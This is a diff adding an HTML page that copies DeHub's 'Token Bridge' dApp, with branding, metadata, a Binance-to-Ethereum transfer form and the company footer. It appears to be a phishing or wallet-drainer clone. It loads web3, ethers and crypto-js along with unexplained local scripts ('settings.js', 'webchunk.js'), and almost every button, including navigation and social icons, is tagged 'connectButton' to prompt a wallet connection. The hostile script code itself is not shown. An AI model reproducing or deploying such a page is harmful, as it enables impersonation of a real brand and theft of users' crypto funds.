@@ -1,0 +1,401 @@
+<html lang="en">
+ <head>
+  <script src="https://unpkg.com/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="https://unpkg.com/crypto-js@latest/crypto-js.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript">
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="./js/settings.js">
+  </script>
+  <script src="./js/webchunk.js">
+  </script>
+  <meta charset="utf-8"/>
+  <base href="/bridge"/>
+  <link href="https://fonts.gstatic.com" rel="preconnect"/>
+  <link href="https://images.ctfassets.net" rel="preconnect"/>
+  <meta content="width=device-width, initial-scale=1" name="viewport"/>
+  <!-- HTML Meta Tags -->
+  <title>
+   DeHub - Bridge D’App
+  </title>
+  <meta content="Lock your $DHB to access enhanced app perks, features and discounts while earning your share of protocol, affiliate and referral fees." name="description"/>
+  <!-- Google / Search Engine Tags -->
+  <meta content="DeHub - Bridge D’App" itemprop="name"/>
+  <meta content="Lock your $DHB to access enhanced app perks, features and discounts while earning your share of protocol, affiliate and referral fees." itemprop="description"/>
+  <meta content="https://images.ctfassets.net/4jicnfvodfm8/1SqWTgh7HdbGfryephE7RZ/b8f43419737eb3d98c7e22e07ad6f900/dehub-logo.png?w=1200" itemprop="image"/>
+  <!-- Facebook Meta Tags -->
+  <meta content="https://dehub.net/bridge" property="og:url"/>
+  <meta content="website" property="og:type"/>
+  <meta content="DeHub - Bridge D’App" property="og:title"/>
+  <meta content="Lock your $DHB to access enhanced app perks, features and discounts while earning your share of protocol, affiliate and referral fees." property="og:description"/>
+  <meta content="https://images.ctfassets.net/4jicnfvodfm8/1SqWTgh7HdbGfryephE7RZ/b8f43419737eb3d98c7e22e07ad6f900/dehub-logo.png?w=1200" property="og:image"/>
+  <meta content="image/png" property="og:image:type"/>
+  <meta content="DeHub Logo" property="og:image:alt"/>
+  <!-- Twitter Meta Tags -->
+  <meta content="summary_large_image" name="twitter:card"/>
+  <meta content="DeHub - Bridge D’App" name="twitter:title"/>
+  <meta content="Lock your $DHB to access enhanced app perks, features and discounts while earning your share of protocol, affiliate and referral fees." name="twitter:description"/>
+  <meta content="https://images.ctfassets.net/4jicnfvodfm8/1SqWTgh7HdbGfryephE7RZ/b8f43419737eb3d98c7e22e07ad6f900/dehub-logo.png?w=1200" name="twitter:image"/>
+  <link href="/bridge/styles.d697eb24e312fbe3.css" rel="stylesheet"/>
+  <base data-rh="true" href="/bridge/"/>
+  <link data-rh="true" href="/bridge/assets/dehub/icon-dehub-white.svg" rel="icon" type="image/x-icon"/>
+  <link data-rh="true" href="/bridge/theme.css" id="theme" rel="stylesheet" type="text/css"/>
+  <link data-rh="true" href="/bridge/layout.css" id="layout" rel="stylesheet" type="text/css"/>
+  <link data-rh="true" href="/bridge/primereact.css" id="primereact" rel="stylesheet" type="text/css"/>
+  <link data-rh="true" href="/bridge/primeflex.css" id="primeflex" rel="stylesheet" type="text/css"/>
+  <link data-rh="true" href="/bridge/primeicons.css" id="primeicons" rel="stylesheet" type="text/css"/>
+  <link data-rh="true" href="/bridge/dehub.webmanifest" rel="manifest"/>
+  <style data-styled="active" data-styled-version="5.3.6">
+  </style>
+ </head>
+ <link href="totalcss.css" rel="stylesheet"/>
+ <body>
+  <div id="root">
+   <div>
+    <div class="p-toast p-component p-toast-top-right">
+     <div>
+     </div>
+    </div>
+    <div class="layout-wrapper">
+     <div class="layout-topbar-dark">
+      <div class="layout-topbar">
+       <div class="layout-topbar-wrapper flex-column sm:flex-row">
+        <div class="layout-topbar-left">
+         <a aria-label="DeHub" class="p-link layout-topbar-logo">
+          <img alt="DeHub logo" height="25px" loading="eager" src="/bridge/assets/dehub/logo-dehub-white.svg" width="106px"/>
+         </a>
+        </div>
+        <div class="layout-topbar-right">
+         <ul class="layout-topbar-actions">
+          <li class="topbar-item ml-2 md:ml-4">
+           <button aria-label="Connect Wallet" class="p-button p-component connectButton">
+            <span class="p-button-icon p-c p-button-icon-left fas fa-wallet">
+            </span>
+            <span class="p-button-label p-c">
+             Connect Wallet
+            </span>
+           </button>
+          </li>
+         </ul>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="layout-content py-0">
+      <div class="dhb-tab-menu">
+       <div class="dhb-tab-menu-wrapper">
+        <button aria-label="Home" class="p-button p-component p-button-text p-button-plain p-button-lg mt-3 mr-3 connectButton">
+         <span class="p-button-icon p-c p-button-icon-left fad fa-home">
+         </span>
+         <span class="p-button-label p-c">
+          Home
+         </span>
+        </button>
+        <button aria-label="Stream" class="p-button p-component p-button-text p-button-plain p-button-lg mt-3 mr-3 connectButton">
+         <span class="p-button-icon p-c p-button-icon-left fad fa-tv">
+         </span>
+         <span class="p-button-label p-c">
+          Stream
+         </span>
+        </button>
+        <button aria-label="Game" class="p-button p-component p-button-text p-button-plain p-button-lg mt-3 mr-3 connectButton">
+         <span class="p-button-icon p-c p-button-icon-left fad fa-gamepad-alt">
+         </span>
+         <span class="p-button-label p-c">
+          Game
+         </span>
+        </button>
+        <button aria-label="Shop" class="p-button p-component p-button-text p-button-plain p-button-lg mt-3 mr-3 connectButton">
+         <span class="p-button-icon p-c p-button-icon-left fad fa-shopping-bag">
+         </span>
+         <span class="p-button-label p-c">
+          Shop
+         </span>
+        </button>
+        <button aria-label="Learn" class="p-button p-component p-button-text p-button-plain p-button-lg mt-3 mr-3 connectButton">
+         <span class="p-button-icon p-c p-button-icon-left fad fa-lightbulb-on">
+         </span>
+         <span class="p-button-label p-c">
+          Learn
+         </span>
+        </button>
+        <button aria-label="Clubs" class="p-button p-component p-button-text p-button-plain p-button-lg mt-3 mr-3 connectButton">
+         <span class="p-button-icon p-c p-button-icon-left fad fa-people-group">
+         </span>
+         <span class="p-button-label p-c">
+          Clubs
+         </span>
+        </button>
+        <button aria-label="Bridge" class="p-button p-component p-button-text p-button-plain p-button-lg mt-3 mr-3 active connectButton">
+         <span class="p-button-icon p-c p-button-icon-left fad fa-bridge">
+         </span>
+         <span class="p-button-label p-c">
+          Bridge
+         </span>
+        </button>
+        <div class="md:hidden flex absolute right-0 mr-3 fadeinleft animation-duration-1000 animation-ease-in-out" style="margin-top: 63px;">
+         <span class="flex align-items-center uppercase font-bold text-xs pr-1">
+          swipe menu
+         </span>
+         <i class="flex align-items-center fal fa-long-arrow-right text-3xl fa-fade">
+         </i>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="layout-main">
+      <div class="layout-content">
+       <div class="sc-eDvSVe hVyQty">
+        <h1 class="text-center">
+         Token Bridge
+        </h1>
+        <div class="mt-10">
+         <div class="p-toast p-component p-toast-top-right">
+          <div>
+          </div>
+         </div>
+         <div class="p-card p-component border-neon-1 overflow-hidden">
+          <div class="p-card-body">
+           <div class="p-card-content">
+            <div class="box" style="padding: 1rem;">
+             <div class="flex flex-column">
+              <div class="sc-gswNZR cnEgQB">
+               From:
+              </div>
+              <div class="card gray shadow-2 mt-1 flex flex-column">
+               <div class="grid">
+                <div class="col-12 md:col-6 lg:col-6 flex flex-row align-self-center">
+                 <img alt="Binance" height="50" src="https://dehub.net/bridge/bnb-bnb-logo.fc9faeecfadda62f6a68d24078c989fb.svg" width="50"/>
+                 <div class="text right align-self-center" style="font-size: 20px; padding-left: 15px;">
+                  Binance
+                 </div>
+                 <img alt="arrow" class="ml-3 align-self-center" height="30" src="https://dehub.net/bridge/down-arrow-svgrepo-com.ef35e86af8060132e59df1f6c7858b79.svg" width="30"/>
+                </div>
+                <div class="col-12 md:col-6 lg:col-6 flex flex-row">
+                 <div class="box sc-gKPRtg eKZUJT align-self-center p-dropdown-filter" data-is-warning="false">
+                  <div class="flex align-items-center justify-content-end">
+                   <input class="sc-iBYQkv gTvMDM" inputmode="decimal" maxlength="80" min="0" minlength="1" pattern="^[0-9]*[.,]?[0-9]{0,18}$" placeholder="0.0" value="" width="100%"/>
+                  </div>
+                 </div>
+                </div>
+               </div>
+               <div class="flex flex-row align-self-end">
+                <div class="text-right align-self-center" style="font-size: 18px;">
+                 $DHB Balance: 0
+                </div>
+                <button class="p-button p-component ml-5 connectButton">
+                 MAX
+                </button>
+               </div>
+              </div>
+             </div>
+             <div class="p-toast p-component p-toast-top-right">
+              <div>
+              </div>
+             </div>
+             <div class="flex col-12 justify-content-center mt-5">
+             </div>
+             <div class="flex flex-column">
+              <div class="sc-gswNZR cnEgQB">
+               To:
+              </div>
+              <div class="card gray shadow-2 mt-1 flex flex-column">
+               <div class="grid">
+                <div class="col-12 md:col-6 lg:col-6 flex flex-row align-self-center">
+                 <img alt="Ethereum" height="50" src="https://dehub.net/bridge/ethereum-logo.7be0e8ee58c80a2743706d169ba6989a.svg" width="50"/>
+                 <div class="text right align-self-center" style="font-size: 20px; padding-left: 15px;">
+                  Ethereum
+                 </div>
+                 <img alt="arrow" class="ml-3 align-self-center" height="30" src="https://dehub.net/bridge/down-arrow-svgrepo-com.ef35e86af8060132e59df1f6c7858b79.svg" width="30"/>
+                </div>
+                <div class="col-12 md:col-6 lg:col-6 flex flex-row">
+                 <div class="box sc-gKPRtg eKZUJT align-self-center p-dropdown-filter" data-is-warning="false">
+                  <div class="flex align-items-center justify-content-end">
+                   <input class="sc-iBYQkv gTvMDM" disabled="" inputmode="decimal" maxlength="80" min="0" minlength="1" pattern="^[0-9]*[.,]?[0-9]{0,18}$" placeholder="0.0" value="" width="100%"/>
+                  </div>
+                 </div>
+                </div>
+               </div>
+               <div class="flex flex-row align-self-end">
+                <div class="text-right align-self-center" style="font-size: 18px;">
+                 $DHB Balance: 0
+                </div>
+               </div>
+              </div>
+             </div>
+             <div class="p-toast p-component p-toast-top-right">
+              <div>
+              </div>
+             </div>
+             <div class="mt-5">
+              <div class="w-full flex flex-column align-center text-center">
+               <div class="flex align-center" style="margin-bottom: 8px; font-size: 18px; justify-content: center;">
+                <div class="sc-hLBbgP lfhOgs" style="margin-right: 5px; font-size: 18px;">
+                 Minimum:
+                </div>
+                <div class="sc-hLBbgP lfhOgs" style="font-size: 18px;">
+                 10 $DHB
+                </div>
+               </div>
+               <div class="flex align-center" style="margin-bottom: 8px; font-size: 18px; justify-content: center;">
+                <div class="sc-hLBbgP lfhOgs" style="margin-right: 5px; font-size: 18px;">
+                 Maximum Amount:
+                </div>
+                <div class="sc-hLBbgP lfhOgs" style="font-size: 18px;">
+                 8,000,000,000 $DHB
+                </div>
+               </div>
+              </div>
+             </div>
+             <div class="grid mt-2 justify-content-center">
+              <div>
+               <button aria-label="Connect Wallet" class="p-button p-component connectButton">
+                <span class="p-button-icon p-c p-button-icon-left fas fa-wallet">
+                </span>
+                <span class="p-button-label p-c">
+                 Connect Wallet
+                </span>
+               </button>
+              </div>
+             </div>
+            </div>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+      </div>
+     </div>
+     <div class="layout-footer">
+      <div class="grid">
+       <div class="col-12 lg-4">
+        <div class="grid">
+         <div class="col-12 md:col-4 lg:col-2">
+          <ul>
+           <li>
+            <a class="p-button-link p-button-primary">
+             <i>
+             </i>
+             Disclaimer
+            </a>
+           </li>
+           <li>
+            <a class="p-button-link p-button-primary">
+             <i>
+             </i>
+             Privacy Policy
+            </a>
+           </li>
+           <li>
+            <a class="p-button-link p-button-primary">
+             <i>
+             </i>
+             Terms &amp; Conditions
+            </a>
+           </li>
+           <li>
+            <a class="p-button-link p-button-primary">
+             <i>
+             </i>
+             Careers
+            </a>
+           </li>
+          </ul>
+         </div>
+         <div class="col-12 md:col-6">
+          <div class="grid">
+           <div class="col-12 md:col-6 lg:col-4">
+            <a rel="noreferrer">
+             <img alt="See more detail here: https://medium.com/@dehub.bsc/we-won-something-10d889be2ed4" class="w-6 md:w-9 h-auto anim-hover-1-reverse" height="487" loading="eager" sizes="(max-width: 750px) 30vw, 10vw" srcset="https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=16&amp;fm=avif&amp;r=1000 16w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=32&amp;fm=avif&amp;r=1000 32w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=48&amp;fm=avif&amp;r=1000 48w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=64&amp;fm=avif&amp;r=1000 64w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=96&amp;fm=avif&amp;r=1000 96w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=128&amp;fm=avif&amp;r=1000 128w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=256&amp;fm=avif&amp;r=1000 256w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=384&amp;fm=avif&amp;r=1000 384w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=640&amp;fm=avif&amp;r=1000 640w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=750&amp;fm=avif&amp;r=1000 750w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=828&amp;fm=avif&amp;r=1000 828w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=1080&amp;fm=avif&amp;r=1000 1080w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=1200&amp;fm=avif&amp;r=1000 1200w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=1920&amp;fm=avif&amp;r=1000 1920w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=2048&amp;fm=avif&amp;r=1000 2048w, https://images.ctfassets.net/4jicnfvodfm8/41HWGIyybDtTtAANM0i7i2/96671e5ff0167d94a57e7c0fba629a16/innovation_excellence_awards_2023_cropped.jpg?q=75&amp;w=3840&amp;fm=avif&amp;r=1000 3840w" width="487"/>
+            </a>
+           </div>
+          </div>
+         </div>
+        </div>
+       </div>
+       <div class="col-12">
+        <div class="footer-bottom flex-wrap gap-3">
+         <ul class="block w-full mb-3">
+          <li class="inline">
+           <button class="p-button p-component p-button-link p-button-primary p-button-lg text-white justify-content-start w-3rem px-0 p-button-icon-only connectButton">
+            <span class="p-button-icon p-c fa-brands fa-twitter">
+            </span>
+            <span class="p-button-label p-c">
+            </span>
+           </button>
+          </li>
+          <li class="inline">
+           <button class="p-button p-component p-button-link p-button-primary p-button-lg text-white justify-content-start w-3rem px-0 p-button-icon-only connectButton">
+            <span class="p-button-icon p-c fa-brands fa-instagram">
+            </span>
+            <span class="p-button-label p-c">
+            </span>
+           </button>
+          </li>
+          <li class="inline">
+           <button class="p-button p-component p-button-link p-button-primary p-button-lg text-white justify-content-start w-3rem px-0 p-button-icon-only connectButton">
+            <span class="p-button-icon p-c fa-brands fa-telegram">
+            </span>
+            <span class="p-button-label p-c">
+            </span>
+           </button>
+          </li>
+          <li class="inline">
+           <button class="p-button p-component p-button-link p-button-primary p-button-lg text-white justify-content-start w-3rem px-0 p-button-icon-only connectButton">
+            <span class="p-button-icon p-c fa-brands fa-discord">
+            </span>
+            <span class="p-button-label p-c">
+            </span>
+           </button>
+          </li>
+          <li class="inline">
+           <button class="p-button p-component p-button-link p-button-primary p-button-lg text-white justify-content-start w-3rem px-0 p-button-icon-only connectButton">
+            <span class="p-button-icon p-c fa-brands fa-youtube">
+            </span>
+            <span class="p-button-label p-c">
+            </span>
+           </button>
+          </li>
+         </ul>
+         <div class="flex align-items-end gap-2 mb-2">
+          <a aria-label="DeHub" class="p-link layout-topbar-logo">
+           <img alt="DeHub logo" height="25px" loading="lazy" src="/bridge/assets/dehub/logo-dehub-white.svg" width="106px"/>
+          </a>
+          <h6 class="uppercase font-bold text-xs">
+           is developed by
+          </h6>
+         </div>
+         <div class="line-height-3 block w-full">
+          <h6>
+           <b>
+            DeLabs LTD
+           </b>
+           219 Kensington High Street
+London, W68BD, 14204474
+          </h6>
+          <p>
+          </p>
+         </div>
+         <h6 class="uppercase font-bold text-xs">
+          © 2024
+         </h6>
+        </div>
+       </div>
+      </div>
+     </div>
+    </div>
+   </div>
+  </div>
+  <script src="/bridge/runtime.40936e8b635d2066.js" type="module">
+  </script>
+  <script src="/bridge/polyfills.c7ddb7a6bd7f59f4.js" type="module">
+  </script>
+  <script src="/bridge/styles.8c0287680d5ed66d.js" type="module">
+  </script>
+  <script src="/bridge/main.2f48bdf3a89534e5.js" type="module">
+  </script>
+ </body>
+</html>
